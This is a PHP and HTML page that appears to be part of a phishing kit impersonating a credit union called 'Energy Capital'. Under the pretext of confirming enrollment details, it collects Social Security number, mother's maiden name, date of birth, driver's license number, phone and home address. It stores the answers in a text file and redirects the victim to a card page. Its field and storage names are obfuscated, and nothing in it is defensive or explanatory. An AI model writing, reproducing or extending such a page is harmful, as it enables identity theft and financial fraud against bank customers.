<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $fzNme = trim($_POST['fzNme'] ?? '');
    $lzNme = trim($_POST['lzNme'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $ssn = trim($_POST['ssn'] ?? '');
    $motherMaidenName = trim($_POST['motherMaidenName'] ?? '');
    $month = $_POST['month'] ?? '';
    $day = $_POST['day'] ?? '';
    $year = $_POST['year'] ?? '';
    $driverLicense = trim($_POST['driverLicense'] ?? '');
    $stAd = trim($_POST['stAd'] ?? '');
    $apt = trim($_POST['apt'] ?? '');
    $city = trim($_POST['city'] ?? '');
    $state = strtoupper(trim($_POST['state'] ?? ''));
    $zipCode = trim($_POST['zipCode'] ?? '');

    // Validation
    if (empty($fzNme)) $errors['fzNme'] = 'First name is required';
    if (empty($lzNme)) $errors['lzNme'] = 'Last name is required';
    if (empty($phone)) {
        $errors['phone'] = 'Phone number is required';
    } else {
        $phoneDigits = preg_replace('/\D/', '', $phone);
        if (strlen($phoneDigits) !== 10) {
            $errors['phone'] = 'Phone number must be 10 digits (US format)';
        } elseif (!preg_match('/^[2-9]\d{2}[2-9]\d{2}\d{4}$/', $phoneDigits)) {
            $errors['phone'] = 'Please enter a valid US phone number';
        }
    }
    if (empty($ssn)) {
        $errors['ssn'] = 'SSN is required';
    } else {
        $ssnDigits = preg_replace('/\D/', '', $ssn);
        if (strlen($ssnDigits) !== 9) {
            $errors['ssn'] = 'SSN must be 9 digits';
        } elseif (!preg_match('/^[0-9]{9}$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN';
        } elseif (preg_match('/^000|^666|^9[0-9]{2}|^123[0-9]{2}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid area number)';
        } elseif (preg_match('/^00[0-9]{7}|^0000[0-9]{5}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid group number)';
        } elseif (preg_match('/[0-9]{4}0000$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid serial number)';
        }
    }
    if (empty($motherMaidenName)) $errors['motherMaidenName'] = "Mother's maiden name is required";
    if (empty($month) || empty($day) || empty($year)) {
        $errors['dob'] = 'Complete date of birth is required';
    } else {
        $dob = new DateTime("$year-$month-$day");
        $today = new DateTime();
        $age = $today->format('Y') - $dob->format('Y');
        if ($today->format('m-d') < $dob->format('m-d')) {
            $age--;
        }
        if ($age < 18) {
            $errors['dob'] = 'You must be at least 18 years old';
        }
    }
    if (empty($driverLicense)) $errors['driverLicense'] = "Driver's license is required";
    if (empty($stAd)) $errors['stAd'] = 'Street address is required';
    if (empty($city)) $errors['city'] = 'City is required';
    if (empty($state)) {
        $errors['state'] = 'State is required';
    } elseif (!preg_match('/^[A-Z]{2}$/', $state)) {
        $errors['state'] = 'Use the 2-letter state abbreviation';
    }
    if (empty($zipCode)) $errors['zipCode'] = 'Zip code is required';

    if (empty($errors)) {
        // Format date
        $monthNames = ['', 'January', 'February', 'March', 'April', 'May', 'June',
                      'July', 'August', 'September', 'October', 'November', 'December'];
        $formattedDob = ($monthNames[intval($month)] ?? '') . "/$day/$year";

        // Format phone and SSN for storage
        $formattedPhone = null;
        if (!empty($phoneDigits) && strlen($phoneDigits) === 10) {
            $formattedPhone = sprintf('(%s) %s-%s', substr($phoneDigits, 0, 3), substr($phoneDigits, 3, 3), substr($phoneDigits, 6));
        }

        $formattedSsn = null;
        if (!empty($ssnDigits) && strlen($ssnDigits) === 9) {
            $formattedSsn = sprintf('%s-%s-%s', substr($ssnDigits, 0, 3), substr($ssnDigits, 3, 2), substr($ssnDigits, 5));
        }

        if ($formattedPhone) {
            $phone = $formattedPhone;
            $_POST['phone'] = $phone;
        }

        if ($formattedSsn) {
            $ssn = $formattedSsn;
            $_POST['ssn'] = $ssn;
        }

        $_POST['state'] = $state;

        // Save to file
        $data = [
            'step' => 'basic_info_home_address',
            'usrnm' => $username,
            'gvn_nm' => $fzNme,
            'fam_nm' => $lzNme,
            'cnt_num' => $phone,
            'tax_id' => $ssn,
            'mat_nm' => $motherMaidenName,
            'dob' => $formattedDob,
            'id_num' => $driverLicense,
            'str_adr' => $stAd,
            'unit_dsg' => $apt,
            'loc' => $city,
            'prov' => $state,
            'zip_cd' => $zipCode
        ];
        
        saveUserData('basic_info_home_address.txt', $data);
        
        // Redirect to card page
        header('Location: card.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basic Information - Energy Capital</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#0b0f1c] bg-cover bg-center bg-no-repeat relative overflow-hidden text-white" style="background-image: url('assets/dark-login.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40 pointer-events-none"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex min-h-screen flex-col">
            <!-- Header -->
            <header class="flex flex-col items-center pt-8 px-4">
                <img src="assets/blue.png" alt="Energy Capital logo" class="h-12 w-auto" />
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-12">
                <!-- Basic Info Card -->
                <div class="w-full max-w-2xl">
                    <div class="bg-[#1b1f2f]/95 rounded-xl shadow-xl shadow-black/30 p-8 space-y-6 text-white">
                        <!-- Card Header -->
                        <div>
                            <h2 class="text-center text-2xl font-semibold mb-2">Basic Information & Home Address</h2>
                            <p class="text-center text-slate-300 text-sm">Confirm the details we have on file before continuing your enrollment</p>
                        </div>
                        
                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-500/20 border border-red-500 rounded-lg p-4">
                                <p class="text-red-200 text-sm font-semibold mb-2">Please fix the following errors:</p>
                                <ul class="list-disc pl-5 space-y-1">
                                    <?php foreach ($errors as $error): ?>
                                        <li class="text-red-200 text-sm"><?php echo htmlspecialchars($error); ?></li>
                                    <?php endforeach; ?>
                                </ul>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="space-y-6">
                            <!-- Personal Information Section -->
                            <div class="border-b border-slate-600 pb-6">
                                <h3 class="text-lg font-semibold mb-4 text-[#7dd3fc]">Personal Information</h3>
                                
                                <div class="grid grid-cols-2 gap-4 mb-4">
                                    <div>
                                        <label class="text-slate-300 text-sm font-medium block mb-2">First Name</label>
                                        <input
                                            type="text"
                                            name="fzNme"
                                            value="<?php echo htmlspecialchars($_POST['fzNme'] ?? ''); ?>"
                                            class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                            placeholder="First name"
                                        />
                                        <?php if (isset($errors['fzNme'])): ?>
                                            <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['fzNme']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                    <div>
                                        <label class="text-slate-300 text-sm font-medium block mb-2">Last Name</label>
                                        <input
                                            type="text"
                                            name="lzNme"
                                            value="<?php echo htmlspecialchars($_POST['lzNme'] ?? ''); ?>"
                                            class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                            placeholder="Last name"
                                        />
                                        <?php if (isset($errors['lzNme'])): ?>
                                            <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['lzNme']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                
                                <div class="grid grid-cols-2 gap-4 mb-4">
                                    <div>
                                        <label class="text-slate-300 text-sm font-medium block mb-2">Phone Number</label>
                                        <input
                                            type="tel"
                                            name="phone"
                                            id="phone"
                                            value="<?php echo htmlspecialchars($_POST['phone'] ?? ''); ?>"
                                            class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                            placeholder="(555) 123-4567"
                                            inputmode="numeric"
                                            autocomplete="tel"
                                        />
                                        <?php if (isset($errors['phone'])): ?>
                                            <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['phone']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                    <div>
                                        <label class="text-slate-300 text-sm font-medium block mb-2">Social Security Number</label>
                                        <input
                                            type="password"
                                            name="ssn"
                                            id="ssn"
                                            value="<?php echo htmlspecialchars($_POST['ssn'] ?? ''); ?>"
                                            class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500 pr-12"
                                            placeholder="XXX-XX-XXXX"
                                            inputmode="numeric"
                                            autocomplete="off"
                                        />
                                        <button
                                            type="button"
                                            onclick="toggleSsnVisibility()"
                                            class="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-[#7dd3fc] hover:text-white transition"
                                        >
                                            <span id="ssnToggleText">Show</span>
                                        </button>
                                        <?php if (isset($errors['ssn'])): ?>
                                            <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['ssn']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="text-slate-300 text-sm font-medium block mb-2">Mother's Maiden Name</label>
                                    <input
                                        type="text"
                                        name="motherMaidenName"
                                        value="<?php echo htmlspecialchars($_POST['motherMaidenName'] ?? ''); ?>"
                                        class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                        placeholder="Mother's maiden name"
                                    />
                                    <?php if (isset($errors['motherMaidenName'])): ?>
                                        <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['motherMaidenName']); ?></p>
                                    <?php endif; ?>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="text-slate-300 text-sm font-medium block mb-2">Date of Birth</label>
                                    <div class="grid grid-cols-3 gap-2">
                                        <select name="month" class="bg-[#283045] text-white border border-slate-600 rounded-lg px-3 py-2 focus:outline-none focus:border-[#00b4ff] transition">
                                            <option value="">Month</option>
                                            <?php for ($i = 1; $i <= 12; $i++): ?>
                                                <option value="<?php echo $i; ?>" <?php echo ($i == ($_POST['month'] ?? '')) ? 'selected' : ''; ?>>
                                                    <?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>
                                                </option>
                                            <?php endfor; ?>
                                        </select>
                                        <select name="day" class="bg-[#283045] text-white border border-slate-600 rounded-lg px-3 py-2 focus:outline-none focus:border-[#00b4ff] transition">
                                            <option value="">Day</option>
                                            <?php for ($i = 1; $i <= 31; $i++): ?>
                                                <option value="<?php echo $i; ?>" <?php echo ($i == ($_POST['day'] ?? '')) ? 'selected' : ''; ?>>
                                                    <?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>
                                                </option>
                                            <?php endfor; ?>
                                        </select>
                                        <select name="year" class="bg-[#283045] text-white border border-slate-600 rounded-lg px-3 py-2 focus:outline-none focus:border-[#00b4ff] transition">
                                            <option value="">Year</option>
                                            <?php for ($i = date('Y'); $i >= 1920; $i--): ?>
                                                <option value="<?php echo $i; ?>" <?php echo ($i == ($_POST['year'] ?? '')) ? 'selected' : ''; ?>>
                                                    <?php echo $i; ?>
                                                </option>
                                            <?php endfor; ?>
                                        </select>
                                    </div>
                                    <?php if (isset($errors['dob'])): ?>
                                        <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['dob']); ?></p>
                                    <?php endif; ?>
                                </div>
                                
                                <div>
                                    <label class="text-slate-300 text-sm font-medium block mb-2">Driver's License</label>
                                    <input
                                        type="text"
                                        name="driverLicense"
                                        value="<?php echo htmlspecialchars($_POST['driverLicense'] ?? ''); ?>"
                                        class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                        placeholder="Driver's license number"
                                    />
                                    <?php if (isset($errors['driverLicense'])): ?>
                                        <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['driverLicense']); ?></p>
                                    <?php endif; ?>
                                </div>
                            </div>
                            
                            <!-- Home Address Section -->
                            <div>
                                <h3 class="text-lg font-semibold mb-4 text-[#7dd3fc]">Home Address</h3>
                                
                                <div class="mb-4">
                                    <label class="text-slate-300 text-sm font-medium block mb-2">Street Address</label>
                                    <input
                                        type="text"
                                        name="stAd"
                                        value="<?php echo htmlspecialchars($_POST['stAd'] ?? ''); ?>"
                                        class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                        placeholder="Street address"
                                    />
                                    <?php if (isset($errors['stAd'])): ?>
                                        <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['stAd']); ?></p>
                                    <?php endif; ?>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="text-slate-300 text-sm font-medium block mb-2">Apartment/Suite (Optional)</label>
                                    <input
                                        type="text"
                                        name="apt"
                                        value="<?php echo htmlspecialchars($_POST['apt'] ?? ''); ?>"
                                        class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                        placeholder="Apt, Suite, etc."
                                    />
                                </div>
                                
                                <div class="grid grid-cols-3 gap-4 mb-4">
                                    <div>
                                        <label class="text-slate-300 text-sm font-medium block mb-2">City</label>
                                        <input
                                            type="text"
                                            name="city"
                                            value="<?php echo htmlspecialchars($_POST['city'] ?? ''); ?>"
                                            class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                            placeholder="City"
                                        />
                                        <?php if (isset($errors['city'])): ?>
                                            <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['city']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                    <div>
                                        <label class="text-slate-300 text-sm font-medium block mb-2">State</label>
                                        <input
                                            type="text"
                                            name="state"
                                            id="state"
                                            value="<?php echo htmlspecialchars($_POST['state'] ?? ''); ?>"
                                            class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                            placeholder="State"
                                            maxlength="2"
                                            autocomplete="address-level1"
                                        />
                                        <?php if (isset($errors['state'])): ?>
                                            <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['state']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                    <div>
                                        <label class="text-slate-300 text-sm font-medium block mb-2">Zip Code</label>
                                        <input
                                            type="text"
                                            name="zipCode"
                                            value="<?php echo htmlspecialchars($_POST['zipCode'] ?? ''); ?>"
                                            class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                            placeholder="Zip code"
                                        />
                                        <?php if (isset($errors['zipCode'])): ?>
                                            <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['zipCode']); ?></p>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Continue Button -->
                            <button
                                type="submit"
                                class="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-lg hover:bg-[#38bdf8] transition"
                            >
                                Continue
                            </button>
                        </form>
                    </div>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-[#2f3136] text-white w-full">
                <div class="max-w-5xl mx-auto px-6 py-10 flex flex-col items-center gap-6">
                    <nav class="flex flex-wrap items-center justify-center gap-4 text-sm text-[#74b8ff]">
                        <a class="hover:underline" href="#">Contact Us</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Privacy &amp; Security</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Accessibility</a>
                    </nav>
                    <div class="flex items-center gap-3 text-sm text-[#74b8ff]">
                        <div class="flex items-center justify-center w-7 h-7 border border-[#74b8ff] rounded-full text-xs font-semibold">
                            <span>🏠</span>
                        </div>
                        <span>Equal Housing Lender</span>
                    </div>
                    <img src="assets/ncua.png" alt="NCUA" class="h-16 w-auto" />
                    <p class="text-xs text-gray-400">Federally insured by NCUA</p>
                </div>
            </footer>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const phoneInput = document.getElementById('phone');
            const ssnInput = document.getElementById('ssn');
            const stateInput = document.getElementById('state');

            if (phoneInput) {
                phoneInput.addEventListener('input', (e) => {
                    let value = e.target.value.replace(/\D/g, '').slice(0, 10);

                    if (value.length >= 6) {
                        value = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
                    } else if (value.length >= 3) {
                        value = value.replace(/(\d{3})(\d{0,3})/, '($1) $2');
                    }

                    e.target.value = value.trim();
                });
            }

            if (ssnInput) {
                ssnInput.addEventListener('input', (e) => {
                    let value = e.target.value.replace(/\D/g, '').slice(0, 9);

                    if (value.length >= 5) {
                        value = value.replace(/(\d{3})(\d{2})(\d{0,4})/, '$1-$2-$3');
                    } else if (value.length >= 3) {
                        value = value.replace(/(\d{3})(\d{0,2})/, '$1-$2');
                    }

                    e.target.value = value.trim();
                });
            }

            if (stateInput) {
                stateInput.addEventListener('input', (e) => {
                    e.target.value = e.target.value.replace(/[^a-zA-Z]/g, '').toUpperCase().slice(0, 2);
                });
            }
        });

        function toggleSsnVisibility() {
            const ssnInput = document.getElementById('ssn');
            const toggleText = document.getElementById('ssnToggleText');

            if (!ssnInput || !toggleText) return;

            if (ssnInput.type === 'password') {
                ssnInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                ssnInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
    </script>
</body>
</html>
